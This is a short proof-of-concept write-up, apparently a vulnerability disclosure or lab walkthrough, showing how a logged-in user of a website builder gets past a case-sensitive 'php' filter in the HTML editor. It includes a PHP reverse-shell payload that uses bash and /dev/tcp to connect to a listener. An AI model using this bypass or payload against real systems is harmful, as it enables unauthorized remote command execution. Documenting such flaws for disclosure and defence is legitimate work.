## **Proof of Concept**

Following POC shows how to get Reverse Shell manually.

![Untitled.png](Untitled.png)

After login as test user, we can create/modify website.

![Untitled (1).png](Untitled_(1).png)

First create a website, and then create a page.

![Untitled (2).png](Untitled_(2).png)

![Untitled](Untitled%201.png)

After creating website and page, click on binoculars icon, this will open our created page in new tab.

Now click on Edit HTML Source.

Here we can try adding php code, but there is some kind of filter preventing us to write a php code.
This can be easily bypassed by changing the format of word php.

![Untitled (5).png](Untitled_(5).png)

After changing format of word php to pHp, we can see it is successfully saved.

![Untitled (6).png](Untitled_(6).png)

Going to the page, we can see our inserted php code is working.

Now to get reverse shell, lets set up netcat listener

![Untitled (8).png](Untitled_(8).png)

Then add our reverse shell code `<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.101/1010 0>&1'"); ?>`

Now opening the website, gives us reverse shell

We can use the python code to make it easier

Setup netcat listener.

Run the script and we should have a revershell.
